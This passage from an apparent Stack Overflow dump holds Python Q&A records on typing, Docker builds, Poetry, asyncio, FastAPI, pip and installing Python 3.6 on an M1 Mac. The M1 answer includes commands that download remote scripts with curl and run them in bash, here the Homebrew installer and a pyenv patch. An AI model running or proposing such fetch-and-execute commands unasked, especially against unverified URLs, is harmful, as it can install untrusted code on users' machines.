|    1080 |         2\n\nThe modified query would look like that:\nselect\n    interval_start,\n    driver_id,\n    sum(seconds_before_trip_ended - seconds_before_trip_started) as seconds\nfrom (\n    select \n        interval_start,\n        driver_id,\n        greatest(0, extract(epoch from start_date - interval_start)::int) as seconds_before_trip_started,\n        least(3600, extract(epoch from coalesce(end_date, '2022-03-10 06:00:00') - interval_start)::int) as seconds_before_trip_ended\n    from (\n        select generate_series(\n            (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, \"offset\" := '0 minutes')) from trips),\n            (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), \"offset\" := '0 minutes')) from trips),\n            '1 hour') as interval_start\n    ) intervals\n    join trips t\n        on t.start_date <= intervals.interval_start + interval '1 hour'\n        and coalesce(t.end_date, '2022-03-10 06:00:00') >= intervals.interval_start\n) subq\ngroup by interval_start, driver_id\norder by interval_start, driver_id;\n\nand give the following result:\n   interval_start    | driver_id | seconds\n---------------------+-----------+---------\n 2022-03-10 01:00:00 |         0 |     720\n 2022-03-10 02:00:00 |         0 |    1440\n 2022-03-10 02:00:00 |         1 |    2760\n 2022-03-10 03:00:00 |         1 |    1200\n 2022-03-10 03:00:00 |         2 |    4260\n 2022-03-10 04:00:00 |         2 |    3600\n 2022-03-10 05:00:00 |         2 |    4680\n 2022-03-10 06:00:00 |         2 |       0\n\n"
}
{
    "Id": 71253495,
    "PostTypeId": 1,
    "Title": "How to annotate the type of arguments forwarded to another function?",
    "Body": "Let's say we have a trivial function that calls open() but with a fixed argument:\ndef open_for_writing(*args, **kwargs):\n    kwargs['mode'] = 'w'\n    return open(*args, **kwargs)\n\nIf I now try to call open_for_writing(some_fake_arg = 123), no type checker (e.g. mypy) can tell that this is an incorrect invocation: it's missing the required file argument, and is adding another argument that isn't part of the open signature.\nHow can I tell the type checker that *args and **kwargs must be a subset of the open parameter spec? I realise Python 3.10 has the new ParamSpec type, but it doesn't seem to apply here because you can't get the ParamSpec of a concrete function like open.\n",
    "AcceptedAnswerId": 71262408,
    "AcceptedAnswer": "I think out of the box this is not possible. However, you could write a decorator that takes the function that contains the arguments you want to get checked for (open in your case) as an input and returns the decorated function, i.e. open_for_writing in your case. This of course only works with python 3.10 or using typing_extensions as it makes use of ParamSpec\nfrom typing import TypeVar, ParamSpec, Callable, Optional\n\nT = TypeVar('T')\nP = ParamSpec('P')\n\n\ndef take_annotation_from(this: Callable[P, Optional[T]]) -> Callable[[Callable], Callable[P, Optional[T]]]:\n    def decorator(real_function: Callable) -> Callable[P, Optional[T]]:\n        def new_function(*args: P.args, **kwargs: P.kwargs) -> Optional[T]:\n            return real_function(*args, **kwargs)\n\n        return new_function\n    return decorator\n\n@take_annotation_from(open)\ndef open_for_writing(*args, **kwargs):\n    kwargs['mode'] = 'w'\n    return open(*args, **kwargs)\n\n\nopen_for_writing(some_fake_arg=123)\nopen_for_writing(file='')\n\nAs shown here, mypy complains now about getting an unknown argument.\n"
}
{
    "Id": 71372066,
    "PostTypeId": 1,
    "Title": "Docker fails to install cffi with python:3.9-alpine in Dockerfile",
    "Body": "Im trying to run the below Dockerfile using docker-compose.\nI searched around but I couldnt find a solution on how to install cffi with python:3.9-alpine.\nI also read this post which states that pip 21.2.4 or greater can be a possible solution but it didn't work out form me\nhttps://www.pythonfixing.com/2021/09/fixed-why-i-getting-this-error-while.html\nDocker file\nFROM python:3.9-alpine\n\nENV PYTHONDONTWRITEBYTECODE 1\nENV PYTHONUNBUFFERED 1\n\nCOPY ./requirements.txt .\n\nRUN apk add --update --no-cache postgresql-client\n\nRUN apk add --update --no-cache --virtual .tmp-build-deps \\\n    gcc libc-dev linux-headers postgresql-dev\nRUN pip3 install --upgrade pip && pip3 install -r /requirements.txt\n\nRUN apk del .tmp-build-deps\n\nRUN mkdir /app\nWORKDIR /app\nCOPY . /app\n\nRUN adduser -D user\n\nUSER user\n\nThis is the requirements.txt file.\nasgiref==3.5.0\nbackports.zoneinfo==0.2.1\ncertifi==2021.10.8\ncffi==1.15.0\ncfgv==3.3.1\n...\n\nError message:\nprocess-exited-with-error\n#9 47.99   \n#9 47.99   \u00d7 Running setup.py install for cffi did not run successfully.\n#9 47.99   \u2502 exit code: 1\n#9 47.99   \u2570\u2500> [58 lines of output]\n#9 47.99       Package libffi was not found in the pkg-config search path.\n#9 47.99       Perhaps you should add the directory containing `libffi.pc'\n#9 47.99       to the PKG_CONFIG_PATH environment variable\n#9 47.99       Package 'libffi', required by 'virtual:world', not found\n#9 47.99       Package libffi was not found in the pkg-config search path.\n#9 47.99       Perhaps you should add the directory containing `libffi.pc'\n#9 47.99       to the PKG_CONFIG_PATH environment variable\n#9 47.99       Package 'libffi', required by 'virtual:world', not found\n#9 47.99       Package libffi was not found in the pkg-config search path.\n#9 47.99       Perhaps you should add the directory containing `libffi.pc'\n#9 47.99       to the PKG_CONFIG_PATH environment variable\n#9 47.99       Package 'libffi', required by 'virtual:world', not found\n#9 47.99       Package libffi was not found in the pkg-config search path.\n#9 47.99       Perhaps you should add the directory containing `libffi.pc'\n#9 47.99       to the PKG_CONFIG_PATH environment variable\n#9 47.99       Package 'libffi', required by 'virtual:world', not found\n#9 47.99       Package libffi was not found in the pkg-config search path.\n#9 47.99       Perhaps you should add the directory containing `libffi.pc'\n#9 47.99       to the PKG_CONFIG_PATH environment variable\n#9 47.99       Package 'libffi', required by 'virtual:world', not found\n#9 47.99       running install\n#9 47.99       running build\n#9 47.99       running build_py\n#9 47.99       creating build\n#9 47.99       creating build/lib.linux-aarch64-3.9\n#9 47.99       creating build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/__init__.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/cffi_opcode.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/commontypes.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/vengine_gen.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/vengine_cpy.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/backend_ctypes.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/api.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/ffiplatform.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/verifier.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/error.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/setuptools_ext.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/lock.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/recompiler.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/pkgconfig.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/cparser.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/model.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/_cffi_include.h -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/parse_c_type.h -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/_embedding.h -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/_cffi_errors.h -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       warning: build_py: byte-compiling is disabled, skipping.\n#9 47.99       \n#9 47.99       running build_ext\n#9 47.99       building '_cffi_backend' extension\n#9 47.99       creating build/temp.linux-aarch64-3.9\n#9 47.99       creating build/temp.linux-aarch64-3.9/c\n#9 47.99       gcc -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O3 -Wall -DTHREAD_STACK_SIZE=0x100000 -fPIC -DUSE__THREAD -DHAVE_SYNC_SYNCHRONIZE -I/usr/include/ffi -I/usr/include/libffi -I/usr/local/include/python3.9 -c c/_cffi_backend.c -o build/temp.linux-aarch64-3.9/c/_cffi_backend.o\n#9 47.99       c/_cffi_backend.c:15:10: fatal error: ffi.h: No such file or directory\n#9 47.99          15 | #include \n#9 47.99             |          ^~~~~~~\n#9 47.99       compilation terminated.\n#9 47.99       error: command '/usr/bin/gcc' failed with exit code 1\n#9 47.99       [end of output]\n#9 47.99   \n#9 47.99   note: This error originates from a subprocess, and is likely not a problem with pip.\n#9 47.99 error: legacy-install-failure\n#9 47.99 \n#9 47.99 \u00d7 Encountered error while trying to install package.\n#9 47.99 \u2570\u2500> cffi\n#9 47.99 \n#9 47.99 note: This is an issue with the package mentioned above, not pip.\n#9 47.99 hint: See above for output from the failure.\n\n",
    "AcceptedAnswerId": 71372163,
    "AcceptedAnswer": "@Klaus D.'s comment helped a lot.\nI updated Dockerfile:\nRUN apk add --update --no-cache --virtual .tmp-build-deps \\\n    gcc libc-dev linux-headers postgresql-dev \\\n    && apk add libffi-dev\n\n"
}
{
    "Id": 71386332,
    "PostTypeId": 1,
    "Title": "How do I specify \"extra\" / bracket dependencies in a pyproject.toml?",
    "Body": "I'm working on a project that specifies its dependencies using Poetry and a pyproject.toml file to manage dependencies. The documentation for one of the libraries I need suggests pip-installing with an \"extra\" option to one of the dependencies, like this:\npip install google-cloud-bigquery[opentelemetry]\n\nHow should I reflect this requirement in the pyproject.toml file?  Currently, there are a few lines like this:\n[tool.poetry.dependencies]\npython = \"3.7.10\"\napache-beam = \"2.31.0\"\ndynaconf = \"3.1.4\"\ngoogle-cloud-bigquery = \"2.20.0\"\n\nChanging the last line to\ngoogle-cloud-bigquery[opentelemetry] = \">=2.20.0\"\n\nyields\nInvalid TOML file /home/jupyter/vertex-monitoring/pyproject.toml: Unexpected character: 'o' at line 17 col 22\n\nOther variants that don't seem to be parsed properly:\ngoogle-cloud-bigquery[\"opentelemetry\"] = \"2.20.0\"\n\nThere are other StackOverflow questions which look related, as well as several different PEP docs, but my searches are complicated because I'm not sure whether these are \"options\" or \"extras\" or something else.\n",
    "AcceptedAnswerId": 71387157,
    "AcceptedAnswer": "You can add it by poetry add \"google-cloud-bigquery[opentelemetry]\". This will result in:\n[tool.poetry.dependencies]\n...\ngoogle-cloud-bigquery = {extras = [\"opentelemetry\"], version = \"^2.34.2\"}\n\n"
}
{
    "Id": 71938799,
    "PostTypeId": 1,
    "Title": "Python asyncio.create_task() - really need to keep a reference?",
    "Body": "The documentation of asyncio.create_task() states the following warning:\n\nImportant: Save a reference to the result of this function, to avoid a task disappearing mid execution. (source)\n\nMy question is: Is this really true?\nI have several IO bound \"fire and forget\" tasks which I want to run concurrently using asyncio by submitting them to the event loop using asyncio.create_task(). However, I do not really care for the return value of the coroutine or even if they run successfully, only that they do run eventually. One use case is writing data from an \"expensive\" calculation back to a Redis data base. If Redis is available, great. If not, oh well, no harm. This is why I do not want/need to await those tasks.\nHere a generic example:\nimport asyncio\n\nasync def fire_and_forget_coro():\n    \"\"\"Some random coroutine waiting for IO to complete.\"\"\"\n    print('in fire_and_forget_coro()')\n    await asyncio.sleep(1.0)\n    print('fire_and_forget_coro() done')\n\n\nasync def async_main():\n    \"\"\"Main entry point of asyncio application.\"\"\"\n    print('in async_main()')\n    n = 3\n    for _ in range(n):\n        # create_task() does not block, returns immediately.\n        # Note: We do NOT save a reference to the submitted task here!\n        asyncio.create_task(fire_and_forget_coro(), name='fire_and_forget_coro')\n\n    print('awaiting sleep in async_main()')\n    await asycnio.sleep(2.0) # <-- note this line\n    print('sleeping done in async_main()')\n\n    print('async_main() done.')\n\n    # all references of tasks we *might* have go out of scope when returning from this coroutine!\n    return\n\nif __name__ == '__main__':\n    asyncio.run(async_main())\n\nOutput:\nin async_main()\nawaiting sleep in async_main()\nin fire_and_forget_coro()\nin fire_and_forget_coro()\nin fire_and_forget_coro()\nfire_and_forget_coro() done\nfire_and_forget_coro() done\nfire_and_forget_coro() done\nsleeping done in async_main()\nasync_main() done.\n\nWhen commenting out the await asyncio.sleep() line, we never see fire_and_forget_coro() finish. This is to be expected: When the event loop started with asyncio.run() closes, tasks will not be excecuted anymore. But it appears that as long as the event loop is still running, all tasks will be taken care of, even when I never explicitly created references to them. This seem logical to me, as the event loop itself must have a reference to all scheduled tasks in order to run them. And we can even get them all using asyncio.all_tasks()!\nSo, I think I can trust Python to have at least one strong reference to every scheduled tasks as long as the event loop it was submitted to is still running, and thus I do not have to manage references myself. But I would like a second opinion here. Am I right or are there pitfalls I have not yet recognized?\nIf I am right, why the explicit warning in the documentation? It is a usual Python thing that stuff is garbage-collected if you do not keep a reference to it. Are there situations where one does not have a running event loop but still some task objects to reference? Maybe when creating an event loop manually (never did this)?\n",
    "AcceptedAnswerId": 71956673,
    "AcceptedAnswer": "There is an open issue at the cpython bug tracker at github about this topic I just found:\nhttps://github.com/python/cpython/issues/88831\nQuote:\n\nasyncio will only keep weak references to alive tasks (in _all_tasks). If a user does not keep a reference to a task and the task is not currently executing or sleeping, the user may get \"Task was destroyed but it is pending!\".\n\nSo the answer to my question is, unfortunately, yes. One has to keep around a reference to the scheduled task.\nHowever, the github issue also describes a relatively simple workaround: Keep all running tasks in a set() and add a callback to the task which removes itself from the set() again.\nrunning_tasks = set()\n# [...]\ntask = asyncio.create_task(some_background_function())\nrunning_tasks.add(task)\ntask.add_done_callback(lambda t: running_tasks.remove(t))\n\n"
}
{
    "Id": 71380024,
    "PostTypeId": 1,
    "Title": "Coverage.py Vs pytest-cov",
    "Body": "The documentation of coverage.py says that Many people choose to use the pytest-cov plugin, but for most purposes, it is unnecessary. So I would like to know what is the difference between these two? And which one is the most efficient ?\nThank you in advance\n",
    "AcceptedAnswerId": 71388807,
    "AcceptedAnswer": "pytest-cov uses coverage.py, so there's no different in efficiency, or basic behavior.  pytest-cov auto-configures multiprocessing settings, and ferries data around if you use pytest-xdist.\n"
}
{
    "Id": 71268169,
    "PostTypeId": 1,
    "Title": "Optional query parameters in FastAPI",
    "Body": "I don't understand optional query parameters in FastAPI. How is it different from default query parameters with a default value of None?\nWhat is the difference between arg1 and arg2 in the example below where arg2 is made an optional query parameter as described in the above link?\n@app.get(\"/info/\")\nasync def info(arg1: int = None, arg2: int | None = None):\n    return {\"arg1\": arg1, \"arg2\": arg2}\n\n",
    "AcceptedAnswerId": 71272615,
    "AcceptedAnswer": "This is covered in the reference manual, albeit just as a small note:\nasync def read_items(q: Optional[str] = None):\n\n\nFastAPI will know that the value of q is not required because of the default value = None.\nThe Optional in Optional[str] is not used by FastAPI, but will allow your editor to give you better support and detect errors.\n\n(Optional[str] is the same as str | None pre 3.10 for other readers)\nSince your editor might not be aware of the context in which the parameter is populated and used by FastAPI, it might have trouble understanding the actual signature of the function when the parameter is not marked as Optional. You may or may not care about this distinction.\n"
}
{
    "Id": 71862398,
    "PostTypeId": 1,
    "Title": "Install python 3.6.* on Mac M1",
    "Body": "I'm trying to run an old app that requires python \nI've installed pyenv-virtualenv and pyenv and successfully installed python 3.7.13. However, when I try to install 3.6.*, I get this:\n$ pyenv install 3.6.13\npython-build: use openssl@1.1 from homebrew\npython-build: use readline from homebrew\nDownloading Python-3.6.13.tar.xz...\n-> https://www.python.org/ftp/python/3.6.13/Python-3.6.13.tar.xz\nInstalling Python-3.6.13...\npython-build: use tcl-tk from homebrew\npython-build: use readline from homebrew\npython-build: use zlib from xcode sdk\n\nBUILD FAILED (OS X 12.3.1 using python-build 2.2.5-11-gf0f2cdd1)\n\nInspect or clean up the working tree at /var/folders/r5/xz73mp557w30h289rr6trb800000gp/T/python-build.20220413143259.33773\nResults logged to /var/folders/r5/xz73mp557w30h289rr6trb800000gp/T/python-build.20220413143259.33773.log\n\nLast 10 log lines:\nchecking for --with-cxx-main=... no\nchecking for clang++... no\nconfigure:\n\n  By default, distutils will build C++ extension modules with \"clang++\".\n  If this is not intended, then set CXX on the configure command line.\n  \nchecking for the platform triplet based on compiler characteristics... darwin\nconfigure: error: internal configure error for the platform triplet, please file a bug report\nmake: *** No targets specified and no makefile found.  Stop.\n\nIs there a way to solve this? I've looked and it seems like Mac M1 doesn't allow installing 3.6.*\n",
    "AcceptedAnswerId": 71957981,
    "AcceptedAnswer": "Copying from a GitHub issue.\n\nI successfully installed Python 3.6 on an Apple M1 MacBook Pro running Monterey using the following setup. There is probably some things in here that can be removed/refined... but it worked for me!\n#Install Rosetta\n/usr/sbin/softwareupdate --install-rosetta --agree-to-license\n\n# Install x86_64 brew\narch -x86_64 /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n\n# Set up x86_64 homebrew and pyenv and temporarily set aliases\nalias brew86=\"arch -x86_64 /usr/local/bin/brew\"\nalias pyenv86=\"arch -x86_64 pyenv\"\n\n# Install required packages and flags for building this particular python version through emulation\nbrew86 install pyenv gcc libffi gettext\nexport CPPFLAGS=\"-I$(brew86 --prefix libffi)/include -I$(brew86 --prefix openssl)/include -I$(brew86 --prefix readline)/lib\"\nexport CFLAGS=\"-I$(brew86 --prefix openssl)/include -I$(brew86 --prefix bzip2)/include -I$(brew86 --prefix readline)/include -I$(xcrun --show-sdk-path)/usr/include -Wno-implicit-function-declaration\" \nexport LDFLAGS=\"-L$(brew86 --prefix openssl)/lib -L$(brew86 --prefix readline)/lib -L$(brew86 --prefix zlib)/lib -L$(brew86 --prefix bzip2)/lib -L$(brew86 --prefix gettext)/lib -L$(brew86 --prefix libffi)/lib\"\n\n# Providing an incorrect openssl version forces a proper openssl version to be downloaded and linked during the build\nexport PYTHON_BUILD_HOMEBREW_OPENSSL_FORMULA=openssl@1.0\n\n# Install Python 3.6\npyenv86 install --patch 3.6.15 <<(curl -sSL https://raw.githubusercontent.com/pyenv/pyenv/master/plugins/python-build/share/python-build/patches/3.6.15/Python-3.6.15/0008-bpo-45405-Prevent-internal-configure-error-when-runn.patch\\?full_index\\=1)\n\nNote, the build succeeds but gives the following warning\nWARNING: The Python readline extension was not compiled. Missing the GNU readline lib?\n\nrunning pyenv versions shows that 3.6.15 can be used normally by the system\n"
}
{
    "Id": 71410741,
    "PostTypeId": 1,
    "Title": "pip uninstall GDAL gives AttributeError: 'PathMetadata' object has no attribute 'isdir'",
    "Body": "I'm trying to pip install geopandas as a fresh installation, so I want to remove existing packages like GDAL and fiona. I've already managed to pip uninstall fiona, but when I try to uninstall or reinstall GDAL it gives the following error message:\n(base) C:\\usr>pip install C:/usr/Anaconda3/Lib/site-packages/GDAL-3.4.1-cp38-cp38-win_amd64.whl\nProcessing c:\\usr\\anaconda3\\lib\\site-packages\\gdal-3.4.1-cp38-cp38-win_amd64.whl\nInstalling collected packages: GDAL\n  Attempting uninstall: GDAL\n    Found existing installation: GDAL 3.0.2\nERROR: Exception:\nTraceback (most recent call last):\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\cli\\base_command.py\", line 167, in exc_logging_wrapper\n    status = run_func(*args)\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\cli\\req_command.py\", line 205, in wrapper\n    return func(self, options, args)\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\commands\\install.py\", line 405, in run\n    installed = install_given_reqs(\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\req\\__init__.py\", line 68, in install_given_reqs\n    uninstalled_pathset = requirement.uninstall(auto_confirm=True)\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\req\\req_install.py\", line 637, in uninstall\n    uninstalled_pathset = UninstallPathSet.from_dist(dist)\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\req\\req_uninstall.py\", line 554, in from_dist\n    for script in dist.iterdir(\"scripts\"):\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\metadata\\pkg_resources.py\", line 156, in iterdir\n    if not self._dist.isdir(name):\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_vendor\\pkg_resources\\__init__.py\", line 2816, in __getattr__\n    return getattr(self._provider, attr)\nAttributeError: 'PathMetadata' object has no attribute 'isdir'\n\nDoes anyone know why GDAL cannot be uninstalled?\n",
    "AcceptedAnswerId": 71417752,
    "AcceptedAnswer": "I just came across this question after getting the same error.  Coincidentally I had just upgraded pip (I was getting tired of the yellow warnings).\nAll I had was to down grade my pip\npip install pip==21.3.1 --user\n\n"
}
{
    "Id": 71391946,
    "PostTypeId": 1,
    "Title": "Does Raku has Python's Union type?",
    "Body": "In Python, Python has Union type, which is convenient when a method can accept multi types:\nfrom typing import Union\n\ndef test(x: Union[str,int,float,]):\n    print(x)\n\nif __name__ == '__main__':\n    test(1)\n    test('str')\n    test(3.1415926)\n\nRaku probably doesn't have Union type as Python, but a where clause can achieve a similar effect:\nsub test(\\x where * ~~ Int | Str | Rat) {\n    say(x)\n}\n\nsub MAIN() {\n    test(1);\n    test('str');\n    test(3.1415926);\n}\n\nI wander if Raku have a possibility to provide the Union type as Python?\n#        vvvvvvvvvvvvvvvvvvvv - the Union type doesn't exist in Raku now.\nsub test(Union[Int, Str, Rat] \\x) {\n    say(x)\n}\n\n",
    "AcceptedAnswerId": 71402432,
    "AcceptedAnswer": "My answer (which is very similar to your first solution ;) would be:\nsubset Union where Int | Rat | Str;\n\nsub test(Union \\x) {\n   say(x) \n}\n\nsub MAIN() {\n    test(1);\n    test('str');\n    test(pi);\n}\n\nConstraint type check failed in binding to parameter 'x'; \nexpected Union but got Num (3.141592653589793e0)\n\n(or you can put a where clause in the call signature, as you have it)\nIn contrast to Python:\n\nthis is native in raku and does not rely on a package like \"typing\" to be imported\nPython Union / SumTypes are used for static hinting, which is good for eg. IDEs\nbut these types are unenforced in Python (per @freshpaste comment and this SO), in raku they are checked and will fail at runtime\n\nSo - the raku syntax is there to do what you ask ... sure, it's a different language so it does it in a different way.\nPersonally I think that a typed language should fail if type checks are breached. It seems to me that type hinting that is not always enforced is a false comfort blanket.\nOn a wider point, raku also offers built in Allomorph types for IntStr, RatStr, NumStr and ComplexStr - so you can work in a mixed mode using both string and math functions\n"
}
{
    "Id": 71470236,
    "PostTypeId": 1,
    "Title": "POST request response 422 error {'detail': [{'loc': ['body'], 'msg': 'value is not a valid dict', 'type': 'type_error.dict'}]}",
    "Body": "My POST request continues to fail with 422 response, even though valid JSON is being sent. I am trying to create a web app that receives an uploaded text file with various genetic markers and sends it to the tensorflow model to make a cancer survival prediction. The link to the github project can be found here.\nHere is the POST request:\n df_json = dataframe.to_json(orient='records')\n prediction = requests.post('http://backend:8080/prediction/', json=json.loads(df_json), headers={\"Content-Type\": \"application/json\"})\n\nAnd here is the pydantic model along with the API endpoint:\nclass Userdata(BaseModel):\nRPPA_HSPA1A : float\nRPPA_XIAP : float\nRPPA_CASP7 : float\nRPPA_ERBB3 :float\nRPPA_SMAD1 : float\nRPPA_SYK : float\nRPPA_STAT5A : float\nRPPA_CD20 : float\nRPPA_AKT1_Akt :float\nRPPA_BAD : float\nRPPA_PARP1 : float\nRPPA_MSH2 : float\nRPPA_MSH6 : float\nRPPA_ACACA : float\nRPPA_COL6A1 : float\nRPPA_PTCH1 : float\nRPPA_AKT1 : float\nRPPA_CDKN1B : float\nRPPA_GATA3 : float\nRPPA_MAPT : float\nRPPA_TGM2 : float\nRPPA_CCNE1 : float\nRPPA_INPP4B : float\nRPPA_ACACA_ACC1 : float\nRPPA_RPS6 : float\nRPPA_VASP : float\nRPPA_CDH1 : float\nRPPA_EIF4EBP1 : float\nRPPA_CTNNB1 : float\nRPPA_XBP1 : float\nRPPA_EIF4EBP1_4E : float\nRPPA_PCNA : float\nRPPA_SRC : float\nRPPA_TP53BP1 : float\nRPPA_MAP2K1 : float\nRPPA_RAF1 : float\nRPPA_MET : float\nRPPA_TP53 : float\nRPPA_YAP1 : float\nRPPA_MAPK8 : float\nRPPA_CDKN1B_p27 : float\nRPPA_FRAP1 : float\nRPPA_RAD50 : float\nRPPA_CCNE2 : float\nRPPA_SNAI2 : float\nRPPA_PRKCA_PKC : float\nRPPA_PGR : float\nRPPA_ASNS : float\nRPPA_BID : float\nRPPA_CHEK2 : float\nRPPA_BCL2L1 : float\nRPPA_RPS6 : float\nRPPA_EGFR : float\nRPPA_PIK3CA : float\nRPPA_BCL2L11 : float\nRPPA_GSK3A : float\nRPPA_DVL3 : float\nRPPA_CCND1 : float\nRPPA_RAB11A : float\nRPPA_SRC_Src_pY416 :float\nRPPA_BCL2L111 : float\nRPPA_ATM : float\nRPPA_NOTCH1 : float\nRPPA_C12ORF5 : float\nRPPA_MAPK9 : float\nRPPA_FN1 : float\nRPPA_GSK3A_GSK3B : float\nRPPA_CDKN1B_p27_pT198 : float\nRPPA_MAP2K1_MEK1 : float\nRPPA_CASP8 : float\nRPPA_PAI : float\nRPPA_CHEK1 : float\nRPPA_STK11 : float\nRPPA_AKT1S1 : float\nRPPA_WWTR1 : float\nRPPA_CDKN1A : float\nRPPA_KDR : float\nRPPA_CHEK2_2 : float\nRPPA_EGFR_pY1173 : float\nRPPA_EGFR_pY992 : float\nRPPA_IGF1R : float\nRPPA_YWHAE : float\nRPPA_RPS6KA1 : float\nRPPA_TSC2 : float\nRPPA_CDC2 : float\nRPPA_EEF2 : float\nRPPA_NCOA3 : float\nRPPA_FRAP1 : float\nRPPA_AR : float\nRPPA_GAB2 : float\nRPPA_YBX1 : float\nRPPA_ESR1 : float\nRPPA_RAD51 : float\nRPPA_SMAD4 : float\nRPPA_CDH3 : float\nRPPA_CDH2 : float\nRPPA_FOXO3 : float\nRPPA_ERBB2_HER : float\nRPPA_BECN1 : float\nRPPA_CASP9 : float\nRPPA_SETD2 : float\nRPPA_SRC_Src_mv : float\nRPPA_GSK3A_alpha : float\nRPPA_YAP1_pS127 : float\nRPPA_PRKCA_alpha : float\nRPPA_PRKAA1 : float\nRPPA_RAF1_pS338 : float\nRPPA_MYC : float\nRPPA_PRKAA1_AMPK : float\nRPPA_ERRFI1_MIG : float\nRPPA_EIF4EBP1_2 : float\nRPPA_STAT3 : float\nRPPA_AKT1_AKT2_AKT3 : float\nRPPA_NF2 : float\nRPPA_PECAM1 : float\nRPPA_BAK1 : float\nRPPA_IRS1 : float\nRPPA_PTK2 : float\nRPPA_ERBB3_2 : float\nRPPA_FOXO3_a : float\nRPPA_RB1_Rb : float\nRPPA_MAPK14_p38 : float\nRPPA_NFKB1 : float\nRPPA_CHEK1_Chk1 : float\nRPPA_LCK : float\nRPPA_XRCC5 : float\nRPPA_PARK7 : float\nRPPA_DIABLO : float\nRPPA_CTNNA1 : float\nRPPA_ESR1_ER : float\nRPPA_IGFBP2 : float\nRPPA_STMN1 : float\nRPPA_WWTR1_TAZ : float\nRPPA_CASP3 : float\nRPPA_JUN : float\nRPPA_CCNB1 : float\nRPPA_CLDN7 : float\nRPPA_PXN : float\nRPPA_RPS6KB1_p : float\nRPPA_KIT : float\nRPPA_CAV1 : float\nRPPA_PTEN : float\nRPPA_BAX : float\nRPPA_SMAD3 : float\nRPPA_ERBB2 : float\nRPPA_MET_c : float\nRPPA_ERCC1 : float\nRPPA_MAPK14 : float\nRPPA_BIRC2 : float\nRPPA_PIK3R1 : float\nRPPA_BCL2 : float\nRPPA_PEA : float\nRPPA_EEF2K : float\nRPPA_RPS6KB1_p70 : float\nRPPA_MRE11A : float\nRPPA_KRAS : float\nRPPA_ARID1A : float\nRPPA_YBX1_yb : float\nRPPA_NOTCH3 : float\nRPPA_EIF4EBP1_3 : float\nRPPA_XRCC1 : float\nRPPA_ANXA1 : float\nRPPA_CD49 : float\nRPPA_SHC1 : float\nRPPA_PDK1 : float\nRPPA_EIF4E : float\nRPPA_MAPK1_MAPK3 : float\nRPPA_PTGS2 : float\nRPPA_PRKCA : float\nRPPA_EGFR_egfr : float\nRPPA_RAB25 : float\nRPPA_RB1 : float\nRPPA_MAPK1 : float\nRPPA_TFF1 : float\n    \nclass config:\n    orm_mode = True\n        \n@app.post(\"/prediction/\")\nasync def create_item(userdata: Userdata):\n    df = pd.DataFrame(userdata)\n    y = model.predict(df)\n    y = [0 if val < 0.5 else 1 for val in y]\n    if y == 1:\n        survival = 'You will survive.'\n    if y == 0:\n        survival = 'You will not survive.'\n    return {'Prediction': survival}\n\n",
    "AcceptedAnswerId": 71471293,
    "AcceptedAnswer": "In Python requests, when sending JSON data using the json parameter, you need to pass a dict object (e.g., json={\"RPPA_HSPA1A\":30,\"RPPA_XIAP\":-0.902044768}), which requests will automatically encode into JSON and set the Content-Type header to application/json. In your case, however, as you are using  to_json() method, the object you get (i.e., df_json as you define it) is a JSON encoded string (you could verify that by printing out type(df_json)). Thus, you should rather use to_dict() method, which returns a dictionary instead. Since you are using orient='records', the returned object will be a list of dict, and thus, you need to get the first element from that list. Example below:\ndata = dataframe.to_dict(orient='records')\npayload = data[0]\nprediction = requests.post('', json=payload)\n\nOtherwise, if you used to_json() method, you would need to use the data parameter when posting the request (see the documentation here), and as mentioned earlier, since you specify the orientation to records that returns a list, you would need to strip both the leading and trailing square brackets from that string. Also, using this method, you would need to manually set the Content-Type header to application/json. Example below:\ndf_json = dataframe.to_json(orient='records')\npayload = df_json.strip(\"[]\")\nprediction = requests.post('', data=payload, headers={\"Content-Type\": \"application/json\"})\n\n"
}
{
    "Id": 71150313,
    "PostTypeId": 1,
    "Title": "python-docx adding bold and non-bold strings to same cell in table",
